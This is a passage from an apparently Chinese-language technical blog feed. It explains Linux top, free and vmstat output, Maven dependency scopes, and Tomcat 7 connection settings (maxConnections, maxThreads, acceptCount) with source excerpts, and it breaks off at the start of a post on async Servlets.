</blockquote>
<blockquote>
<ul>
<li>(ni) nice：CPU 在高 nice 值(低优先级)用户态以低优先级运行占用的时间(nice&gt;0)。默认新启动的进程 nice=0，是不会计入这里的，除非手动通过 renice 或者 setpriority() 的方式修改程序的nice值</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(id) idle：CPU 在空闲状态(执行 kernel idle handler )所占用的时间</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(wa) iowait：等待 IO 完成做占用的时间</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(hi) irq：系统处理硬件中断所消耗的时间</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(si) softirq：系统处理软中断所消耗的时间，记住软中断分为 softirqs、tasklets (其实是前者的特例)、work queues，不知道这里是统计的是哪些的时间，毕竟 work queues 的执行已经不是中断上下文了</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>(st) steal：在虚拟机情况下才有意义，因为虚拟机下 CPU 也是共享物理 CPU 的，所以这段时间表明虚拟机等待 hypervisor 调度 CPU 的时间，也意味着这段时间 hypervisor 将 CPU 调度给别的 CPU 执行，这个时段的 CPU 资源被“stolen”了。这个值在我 KVM 的 VPS 机器上是不为 0 的，但也只有 0.1 这个数量级，是不是可以用来判断 VPS 超售的情况？</li>
</ul>
</blockquote>
<p>iowait所包含的信息其实是非常少的，具体的解释可以看<strong>参考3</strong>中的文章，讲的非常好.</p>
<blockquote>
<p>%iowait 表示在一个采样周期内有百分之几的时间属于以下情况：CPU空闲、并且有仍未完成的I/O请求</p>
</blockquote>
<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>第四行主要是内存使用的相关信息， 系统的内存总共有<code>65979844k</code>， 已经使用<code>65004736k</code>, <code>975108k</code>可用， <code>8108k</code>缓存, </p>
<p>65979844k = 65004736k + 975108k</p>
<p>可见缓存的也包含在可用的内存中。</p>
<p>这些信息也可以通过<code>free -k</code> （还可以-m, -g 表示展示的单位），<code>free</code>的输出如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx /home/www/xxx]$ free -k</span><br><span class="line">             total       used       free     shared    buffers     cached</span><br><span class="line">Mem:      65979844   64863960    1115884        112       8824    5331160</span><br><span class="line">-/+ buffers/cache:   59523976    6455868 </span><br><span class="line">Swap:     50331644      29364   50302280</span><br></pre></td></tr></table></figure>
<p><code>vmstat</code> 也可以看到系统的内存状况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@xxx /home/www/xxx]$ vmstat 1 3 | column -t</span><br><span class="line">procs  -----------memory----------  ---swap--  -----io----  --system--  -----cpu-----</span><br><span class="line">r      b                            swpd       free         buff        cache          si  so  bi   bo   <span class="keyword">in</span>     cs     us  sy  id  wa  st</span><br><span class="line">5      1                            29364      2231704      8808        4214104        0   0   124  230  0      0      15  1   84  0   0</span><br><span class="line">6      0                            29364      2219016      8908        4225260        0   0   668  132  47040  68271  25  2   72  0   0</span><br><span class="line">5      0                            29364      2209552      8916        4234020        0   0   512  12   37178  52578  20  2   78  0   0</span><br></pre></td></tr></table></figure>
<p>第五行和第四行类似，输出的是swap的使用情况。</p>
<h3 id="进程的详细信息"><a href="#进程的详细信息" class="headerlink" title="进程的详细信息"></a>进程的详细信息</h3><blockquote>
<p>PID：进程的ID<br>USER：进程所有者<br>PR：进程的优先级别，越小越优先被执行<br>NI：nice值<br>VIRT：进程占用的虚拟内存<br>RES：进程占用的物理内存<br>SHR：进程使用的共享内存<br>S：进程的状态。S表示休眠，R表示正在运行，Z表示僵死状态，N表示该进程优先值为负数<br>%CPU：进程占用CPU的使用率<br>%MEM：进程使用的物理内存和总内存的百分比<br>TIME+：该进程启动后占用的总的CPU时间，即占用CPU使用时间的累加值。<br>COMMAND：进程启动命令名称</p>
</blockquote>
<h2 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h2><h3 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h3><ul>
<li><p>按照CPU占用排序： 交互模式下输入： <code>P</code></p>
</li>
<li><p>按照内存排序： 交互模式下输入： <code>M</code></p>
</li>
<li><p>杀死进程： 交互模式下输入: <code>k</code>, 然后根据提示输入相应的<code>pid</code></p>
</li>
<li><p>更改刷新时间： 交互模式下输入: <code>d</code>或者<code>s</code>, 然后输入相应的刷新值</p>
</li>
<li><p>显示CPU的每个核的使用情况： 交互模式下输入： 键盘上的<code>1</code></p>
</li>
</ul>
<p>top的显示界面会展开：</p>
<img src="/2017/09/09/top/cpu.png">
<ul>
<li>高亮模式： 交互模式下输入: ‘z’</li>
</ul>
<img src="/2017/09/09/top/highlight.png">
<ul>
<li>高亮当前的排序列(需要在z模式下)： 交互模式下输入: ‘x’</li>
</ul>
<img src="/2017/09/09/top/highlight-sort.png">
<ul>
<li><p>改变排序列： 交互模式下按<code>shift</code> + <code>&lt;</code>或<code>&gt;</code></p>
</li>
<li><p>增加显示的Field： 交互模式下按<code>f</code>, 然后选择想要展示的列</p>
</li>
</ul>
<img src="/2017/09/09/top/fields.png">
<ul>
<li><p>显示到线程级别： 交互模式下按<code>H</code></p>
</li>
<li><p>显示完整的命令名称: 交互模式下按<code>c</code></p>
</li>
<li><p>分类显示各种系统资源高的进程： 交互模式下按<code>A</code></p>
</li>
</ul>
<img src="/2017/09/09/top/top-a.png">
<h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><ul>
<li>显示某个进程的线程信息</li>
</ul>
<p><code>top -p &lt;PID&gt; -H</code></p>
<p>其中 <code>-H</code>是指显示线程的信息，可以看到每个线程的CPU占用情况</p>

<ul>
<li>显示完整的命令： <code>-c</code></li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><p><a href="http://kumu-linux.github.io/blog/2013/06/07/top-hacks/" rel="external nofollow noopener noreferrer" target="_blank">top实践小技巧 - OPS Notes By 枯木</a></p>
</li>
<li><p><a href="http://mp.weixin.qq.com/s?__biz=MzAxMzQ3NzQ3Nw==&amp;mid=2654249787&amp;idx=2&amp;sn=7aa8e765fda84d5fa26580c210585c53&amp;chksm=8061f031b716792776833370019a9fc4c79fa40ea7db5b4ccb165b90919056acaffd3d971d94&amp;mpshare=1&amp;scene=1&amp;srcid=0801QspCI2Xo04BsZlP6pCVb##" rel="external nofollow noopener noreferrer" target="_blank">Linux服务器的那些性能参数指标</a></p>
</li>
<li><p><a href="http://linuxperf.com/?p=33" rel="external nofollow noopener noreferrer" target="_blank">理解 %iowait (%wio) | Linux Performance</a></p>
</li>
<li><p><a href="http://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/top.html" rel="external nofollow noopener noreferrer" target="_blank">8. top linux下的任务管理器 — Linux Tools Quick Tutorial</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> top </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jvm-flag]]></title>
      <url>http://qsli.github.io/2017/06/03/jvm-flag/</url>
      <content type="html"><![CDATA[<p>jinfo</p>
<p>-Xss</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[maven-scope]]></title>
      <url>http://qsli.github.io/2017/06/01/maven-scope/</url>
      <content type="html"><![CDATA[<h2 id="scope-作用"><a href="#scope-作用" class="headerlink" title="scope 作用"></a>scope 作用</h2><blockquote>
<p>Dependency scope is used to limit the transitivity of a dependency, and also to affect the classpath used for various build tasks.</p>
</blockquote>
<p>主要是限制依赖的传递性，比如有些jar包只会在测试的时候才会有效，部署的时候不会生效。</p>
<p>scope的分类：</p>
<table>
<thead>
<tr>
<th>scope</th>
<th>生效时机</th>
<th>举例</th>
</tr>
</thead>
<tbody>
<tr>
<td>compiled</td>
<td>编译/测试/运行</td>
<td>默认</td>
</tr>
<tr>
<td>provided</td>
<td>编译/测试</td>
<td>servlet-api 由tomcat等容器提供</td>
</tr>
<tr>
<td>runtime</td>
<td>运行</td>
<td>编译的时候只需要，JDBC API， 运行的时候必须要有JDBC驱动实现</td>
</tr>
<tr>
<td>test</td>
<td>测试的时候才引入</td>
<td>junit 只在测试的时候生效</td>
</tr>
<tr>
<td>system</td>
<td>编译/测试</td>
<td>必须显式的提供jar的本地文件系统路径</td>
</tr>
<tr>
<td>import</td>
<td>只支持<code>dependencyManagement</code>元素下的type是pom的节点</td>
<td>only available in Maven 2.0.9 or later</td>
</tr>
</tbody>
</table>
<h3 id="import-scope"><a href="#import-scope" class="headerlink" title="import scope"></a>import scope</h3><p>使用方</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.air<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;com.air.haha.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>com.air.haha的声明</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.air<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>haha<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>a<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>b<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用方在使用的时候就可以不用指定，haha中包含的依赖的版本，默认就会使用haha中声明的版本。这样在升级的时候，可以保证依赖一同的升级。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html" rel="external nofollow noopener noreferrer" target="_blank">Maven – Introduction to the Dependency Mechanism</a></p>
</li>
<li><p>《Maven权威指南》—— 9.4 （项目依赖）</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> maven </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[tomcat连接数相关的配置]]></title>
      <url>http://qsli.github.io/2017/04/05/tomcat-connection/</url>
      <content type="html"><![CDATA[<p><em>以下是tomcat7的一些配置说明</em></p>
<h1 id="tomcat交互图"><a href="#tomcat交互图" class="headerlink" title="tomcat交互图"></a>tomcat交互图</h1><img src="/2017/04/05/tomcat-connection/tomcat-interaction.jpg" title="图片取自参考1">
<h2 id="maxConnections"><a href="#maxConnections" class="headerlink" title="maxConnections"></a>maxConnections</h2><p>tomcat接受的最大连接的个数，超过这个连接个数，acceptor就会阻塞。</p>
<blockquote>
<p>The maximum number of connections that the server will accept and process at any given time. When this number has been reached, the server will accept, but not process, one further connection. This additional connection be blocked until the number of connections being processed falls below maxConnections at which point the server will start accepting and processing new connections again. Note that once the limit has been reached, the operating system may still accept connections based on the acceptCount setting. The default value varies by connector type. For BIO the default is the value of maxThreads unless an Executor is used in which case the default will be the value of maxThreads from the executor. For NIO the default is 10000. For APR/native, the default is 8192.</p>
</blockquote>
<p>需要注意的是，在BIO模式下，<code>maxConnections</code>的值默认等于<code>maxThreads</code>的值!!!</p>
<p>达到maxConnections之后，acceptor线程就会阻塞，用jstack查看堆栈会发现Acceptor线程阻塞在下面的代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u tomcat jstack  `pgrep -f <span class="string">'tomcat'</span>` | less</span><br></pre></td></tr></table></figure>
<p>tomcat  7的源码中相应的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if we have reached max connections, wait</span></span><br><span class="line">countUpOrAwaitConnection();</span><br></pre></td></tr></table></figure>
<p>函数的具体实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">countUpOrAwaitConnection</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (maxConnections==-<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    LimitLatch latch = connectionLimitLatch;</span><br><span class="line">    <span class="keyword">if</span> (latch!=<span class="keyword">null</span>) latch.countUpOrAwait();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>LimitLatch</code>是tomcat自己实现的一个类似<code>CountDownLatch</code>的东西。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Shared latch that allows the latch to be acquired a limited number of times</span></span><br><span class="line"><span class="comment"> * after which all subsequent requests to acquire the latch will be placed in a</span></span><br><span class="line"><span class="comment"> * FIFO queue until one of the shares is returned.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LimitLatch</span> </span>&#123;...&#125;</span><br></pre></td></tr></table></figure>
<p>它的初始化过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> LimitLatch <span class="title">initializeConnectionLatch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (maxConnections==-<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (connectionLimitLatch==<span class="keyword">null</span>) &#123;</span><br><span class="line">        connectionLimitLatch = <span class="keyword">new</span> LimitLatch(getMaxConnections());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> connectionLimitLatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="maxThreads"><a href="#maxThreads" class="headerlink" title="maxThreads"></a>maxThreads</h2><p>tomcat的连接线程最大个数。</p>
<blockquote>
<p>The maximum number of request processing threads to be created by this Connector, which therefore determines the maximum number of simultaneous requests that can be handled. If not specified, this attribute is set to 200. If an executor is associated with this connector, this attribute is ignored as the connector will execute tasks using the executor rather than an internal thread pool. Note that if an executor is configured any value set for this attribute will be recorded correctly but it will be reported (e.g. via JMX) as -1 to make clear that it is not used.</p>
</blockquote>
<blockquote>
<p>maxThreads、minSpareThreads是tomcat工作线程池的配置参数，maxThreads就相当于jdk线程池的maxPoolSize，而minSpareThreads就相当于jdk线程池的corePoolSize。</p>
</blockquote>
<p>相应的代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createExecutor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    internalExecutor = <span class="keyword">true</span>;</span><br><span class="line">    TaskQueue taskqueue = <span class="keyword">new</span> TaskQueue();</span><br><span class="line">    TaskThreadFactory tf = <span class="keyword">new</span> TaskThreadFactory(getName() + <span class="string">"-exec-"</span>, daemon, getThreadPriority());</span><br><span class="line">    executor = <span class="keyword">new</span> ThreadPoolExecutor(getMinSpareThreads(), getMaxThreads(), <span class="number">60</span>, TimeUnit.SECONDS,taskqueue, tf);</span><br><span class="line">    taskqueue.setParent( (ThreadPoolExecutor) executor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="acceptCount"><a href="#acceptCount" class="headerlink" title="acceptCount"></a>acceptCount</h2><p>系统积压队列的大小。</p>
<blockquote>
<p>The maximum queue length for incoming connection requests when all possible request processing threads are in use. Any requests received when the queue is full will be refused. The default value is 100.</p>
</blockquote>
<p>tomcat7的源码中有这么一段，大概就是别名的替换。<code>acceptCount</code>被替换成了<code>backlog</code>，<code>backlog</code>的意思是积压的东西。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    replacements.put(<span class="string">"acceptCount"</span>, <span class="string">"backlog"</span>);</span><br><span class="line">    replacements.put(<span class="string">"connectionLinger"</span>, <span class="string">"soLinger"</span>);</span><br><span class="line">    replacements.put(<span class="string">"connectionTimeout"</span>, <span class="string">"soTimeout"</span>);</span><br><span class="line">    replacements.put(<span class="string">"rootFile"</span>, <span class="string">"rootfile"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>acceptCount</code>是在初始<code>bind</code>的时候传给jdk的<code>bind</code>函数的，最终会传递到系统层。<br>以<code>NioEndpoint</code>为例，大概如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Initialize the endpoint.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">       serverSock = ServerSocketChannel.open();</span><br><span class="line">       socketProperties.setProperties(serverSock.socket());</span><br><span class="line">       InetSocketAddress addr = (getAddress()!=<span class="keyword">null</span>?<span class="keyword">new</span> InetSocketAddress(getAddress(),getPort()):<span class="keyword">new</span> InetSocketAddress(getPort()));</span><br><span class="line">       serverSock.socket().bind(addr,getBacklog());</span><br><span class="line">       serverSock.configureBlocking(<span class="keyword">true</span>); <span class="comment">//mimic APR behavior</span></span><br><span class="line">       serverSock.socket().setSoTimeout(getSocketProperties().getSoTimeout());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Initialize thread count defaults for acceptor, poller</span></span><br><span class="line">       <span class="keyword">if</span> (acceptorThreadCount == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// <span class="doctag">FIXME:</span> Doesn't seem to work that well with multiple accept threads</span></span><br><span class="line">           acceptorThreadCount = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (pollerThreadCount &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">//minimum one poller thread</span></span><br><span class="line">           pollerThreadCount = <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       stopLatch = <span class="keyword">new</span> CountDownLatch(pollerThreadCount);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Initialize SSL if needed</span></span><br><span class="line">       <span class="keyword">if</span> (isSSLEnabled()) &#123;</span><br><span class="line">          <span class="comment">//ssl stuff</span></span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (oomParachute&gt;<span class="number">0</span>) reclaimParachute(<span class="keyword">true</span>);</span><br><span class="line">       selectorPool.open();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>看下<code>getBackLog</code>的实现(<code>AbstractEndpoint</code>)：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Allows the server developer to specify the backlog that</span></span><br><span class="line"><span class="comment"> * should be used for server sockets. By default, this value</span></span><br><span class="line"><span class="comment"> * is 100.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> backlog = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBacklog</span><span class="params">(<span class="keyword">int</span> backlog)</span> </span>&#123; <span class="keyword">if</span> (backlog &gt; <span class="number">0</span>) <span class="keyword">this</span>.backlog = backlog; &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBacklog</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> backlog; &#125;</span><br></pre></td></tr></table></figure>
<p>默认值大小是<code>100</code>。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>tomcat的<code>Acceptor</code>线程会不停的从系统的全连接队列里去拿对应的socket连接，直到达到了<code>maxConnections</code>的值。<br>之后<code>Acceptor</code>会阻塞在那里，直到处理的连接小于<code>maxConnections</code>的值。如果一直阻塞的话，就会在系统的tcp<br>连接队列中阻塞，这个队列的长度是<code>acceptCount</code>控制的，默认是<code>100</code>。如果仍然处理不过来，系统可能就会丢掉<br>一些建立的连接了。</p>
<p>所以，大致可以估计下最多能处理的连接数：</p>
<p><code>最大处理连接数 = acceptCount + maxConnection</code></p>
<p>#参考</p>
<ol>
<li><p><a href="https://segmentfault.com/a/1190000008064162" rel="external nofollow noopener noreferrer" target="_blank">tomcat的acceptCount与maxConnections - xixicat - SegmentFault</a></p>
</li>
<li><p><a href="https://tomcat.apache.org/tomcat-7.0-doc/config/http.html" rel="external nofollow noopener noreferrer" target="_blank">Apache Tomcat 7 Configuration Reference (7.0.77) - The HTTP Connector</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> tomcat </category>
            
        </categories>
        
        
        <tags>
            
            <tag> connections </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[异步Servlet及Spring对其的支持]]></title>
      <url>http://qsli.github.io/2017/02/28/servlet-async/</url>
      <content type="html"><![CDATA[<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>限定 tomcat的连接池个数为50，并发为200（&gt;&gt; 线程池大小），时异步具有很大的优势。</p>
<p>如果并发量小于线程池大小，异步的反倒比同步的时间长了很久。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">protocol</span>=<span class="string">"HTTP/1.1"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">maxThreads</span>=<span class="string">"50"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">redirectPort</span>=<span class="string">"8443"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>完整的测试代码地址： <a href="https://github.com/qsLI/Java_Tutorial/blob/master/web/src/main/java/com/air/async/AsyncRequestProcessor.java" rel="external nofollow noopener noreferrer" target="_blank"></a></p>
<h3 id="async-ab测试"><a href="#async-ab测试" class="headerlink" title="async ab测试"></a>async ab测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 